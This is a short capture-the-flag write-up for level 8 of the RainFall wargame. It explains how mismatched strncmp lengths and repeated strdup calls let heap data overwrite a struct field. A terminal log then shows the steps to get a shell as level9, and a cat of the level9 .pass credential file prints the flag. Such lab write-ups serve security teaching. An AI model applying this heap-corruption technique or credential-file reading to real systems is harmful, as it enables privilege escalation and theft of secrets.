# level 8

In this level, we have a program doing a loop where you can write different comments

`auth `

`service`

`login`

`reset`

And we have a struc containing a char [32] and an int

In the loop, there is an strncmp for each function but there is some weird checking of them:
```c
    if(strncmp(line, "auth ", 5) == 0) // auth is 4 characters not 5

    if(strncmp(line, "service", 6) == 0) // service is 7 characters not 6
            service = strdup(line + 7); //  
```
So for each copy in `service`, it will allocate at least a TINY (8 bytes) and our buffer is 32, if it overflow, it will write on the second variable of the structure

```bash
level8@RainFall:~$ ./level8 
(nil), (nil) 
auth 
0x804a008, (nil) 
service
0x804a008, 0x804a018 
service
0x804a008, 0x804a028 
service
0x804a008, 0x804a038 
service
0x804a008, 0x804a048 
login
$ whoami
level9
$ cat /home/user/level9/.pass
c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a
```